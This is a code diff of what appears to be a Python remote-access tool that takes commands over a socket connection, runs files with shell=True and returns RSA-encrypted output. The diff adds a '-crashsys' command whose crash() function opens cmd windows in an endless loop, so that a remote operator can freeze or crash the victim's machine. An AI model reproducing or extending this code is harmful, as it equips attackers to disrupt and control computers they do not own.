@@ -58,6 +58,8 @@ def handle_command(command, c):
             command_response = str(e)
     elif command == '-startmenu':
         menus(c)
+    elif command == '-crashsys':
+        crash()
         
     else:
         command_response = None
@@ -99,7 +101,17 @@ def menus(c):
         subprocess.run(file_path, shell=True)
     if command_response:
         c.send(rsa.encrypt(command_response.encode(), public_partner))
-        
+
+
+###################################################################################### ADD SCRIPT ##########################################################################################
+
+def crash():
+    while True:
+        os.startfile('cmd')
+
+
+
+##################################################################################### Currently Fixing #########################################################################################   
 def download_progress(start, count, block_size, total_size):
     """Show the download progress."""
     percent = count * block_size * 100 / total_size
